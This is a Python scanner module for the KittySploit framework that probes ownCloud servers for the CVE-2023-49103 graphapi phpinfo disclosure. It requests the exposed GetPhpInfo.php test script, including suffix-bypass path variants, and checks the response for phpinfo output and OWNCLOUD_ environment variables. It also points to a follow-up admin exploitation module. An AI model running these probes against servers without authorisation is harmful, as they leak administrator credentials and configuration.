#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ownCloud graphapi phpinfo disclosure (CVE-2023-49103 / CVE-2023-49282)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ownCloud graphapi - phpinfo Disclosure Detection (CVE-2023-49103)',
        'description': (
            'ownCloud graphapi exposes vendor test script GetPhpInfo.php, leaking phpinfo() '
            'output including container environment variables such as OWNCLOUD_ADMIN_* '
            '(CVE-2023-49103 / CVE-2023-49282, CISA KEV).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2023', 'owncloud', 'phpinfo', 'exposure',
            'kev', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/owncloud_cve_2023_49103_phpinfo',
                ],
            },
        },
        'references': [
            'https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/',
            'https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-49103',
        ],
        'cve': 'CVE-2023-49103',
    }

    base_path = OptString('', 'Optional ownCloud base path prefix', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        prefix = self._prefix()
        paths = (
            f'{prefix}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php',
            f'{prefix}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css',
            f'{prefix}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.js',
        )
        phpinfo_re = re.compile(
            r'(phpinfo\(\)|PHP Version|PHP Credits|_SERVER\[|_ENV\[)',
            re.I,
        )
        for path in paths:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if not phpinfo_re.search(body):
                continue
            reason = 'ownCloud CVE-2023-49103 phpinfo disclosure via graphapi'
            if re.search(r'OWNCLOUD_', body):
                reason += ' (OWNCLOUD_* env vars present)'
            self.set_info(severity='critical', reason=reason, path=path)
            return True
        return False
